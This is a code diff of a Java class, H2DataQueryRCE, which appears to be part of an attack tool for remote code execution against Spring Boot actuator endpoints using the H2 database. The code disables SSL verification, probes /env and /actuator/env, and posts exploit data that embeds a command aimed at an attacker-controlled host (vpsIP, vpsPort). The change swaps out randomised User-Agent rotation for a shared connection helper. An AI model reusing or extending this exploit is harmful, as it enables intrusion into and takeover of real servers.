@@ -1,20 +1,16 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
 import src.main.impl.ResultCallback;
 
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.Base64;
-import java.util.List;
-import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-import java.util.stream.Stream;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class H2DataQueryRCE {
     private String address;
@@ -40,19 +36,13 @@ public class H2DataQueryRCE {
         String restsite = address + restapi;
         String llib = "h2database";
         String data = "";
-        String ua = "";
         disableSSLVerification();
         String cmd = String.format(cmdtmp,vpsIP,vpsPort);
         count = (int) (Math.random() * 9000) + 1000;
         flag = "T" + String.valueOf(count);
         data = String.format(expData1,flag,flag,cmd);
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -69,10 +59,7 @@ public class H2DataQueryRCE {
                 if (matcher.find()) {
                     text = String.format("h2database 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(site);
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent",ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                     conn1.setDoOutput(true);
@@ -83,10 +70,7 @@ public class H2DataQueryRCE {
                     int responseCode1 = conn1.getResponseCode();
                     if (responseCode1 == HttpURLConnection.HTTP_OK){
                         ++count;
-                        URL obj2 = new URL(restsite);
-                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                        ua = uacf.getRandomUserAgent(ualist);
-                        conn2.setRequestProperty("User-Agent",ua);
+                        HttpURLConnection conn2 = HTTPConfig.createConnection(restsite);
                         conn2.setRequestMethod("POST");
                         conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                         conn2.setDoOutput(true);
@@ -123,19 +107,13 @@ public class H2DataQueryRCE {
         String restsite = address + restapi;
         String llib = "h2database";
         String data = "";
-        String ua = "";
         disableSSLVerification();
         String cmd = String.format(cmdtmp,vpsIP,vpsPort);
         count = (int) (Math.random() * 9000) + 1000;
         flag = "T" + String.valueOf(count);
         data = String.format(expData2,flag,flag,cmd);
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -152,10 +130,7 @@ public class H2DataQueryRCE {
                 if (matcher.find()) {
                     text = String.format("h2database 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(site);
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent",ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type","application/json");
                     conn1.setDoOutput(true);
@@ -166,10 +141,7 @@ public class H2DataQueryRCE {
                     int responseCode1 = conn1.getResponseCode();
                     if (responseCode1 == HttpURLConnection.HTTP_OK){
                         ++count;
-                        URL obj2 = new URL(restsite);
-                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                        ua = uacf.getRandomUserAgent(ualist);
-                        conn2.setRequestProperty("User-Agent",ua);
+                        HttpURLConnection conn2 = HTTPConfig.createConnection(restsite);
                         conn2.setRequestMethod("POST");
                         conn2.setRequestProperty("Content-Type","application/json");
                         conn2.setDoOutput(true);
@@ -204,15 +176,10 @@ public class H2DataQueryRCE {
         String api = "/env";
         String site = address + api;
         String llib = "h2database";
-        String ua = "";
         disableSSLVerification();
         try {
             URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -229,10 +196,8 @@ public class H2DataQueryRCE {
                 if (matcher.find()) {
                     text = String.format("h2database 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(address + "/actuator");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                     conn1.setDoOutput(true);
-                    conn1.setRequestProperty("User-Agent", ua);
                     conn1.setRequestMethod("GET");
                     int responseCode1 = conn1.getResponseCode();
                     BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -264,15 +229,9 @@ public class H2DataQueryRCE {
         String api = "/actuator/env";
         String site = address + api;
         String llib = "h2database";
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -289,10 +248,8 @@ public class H2DataQueryRCE {
                 if (matcher.find()) {
                     text = String.format("h2database 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(address + "/actuator");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                     conn1.setDoOutput(true);
-                    conn1.setRequestProperty("User-Agent", ua);
                     conn1.setRequestMethod("GET");
                     int responseCode1 = conn1.getResponseCode();
                     BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -323,15 +280,9 @@ public class H2DataQueryRCE {
     public void Exp(ResultCallback callback){
         String api ="/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
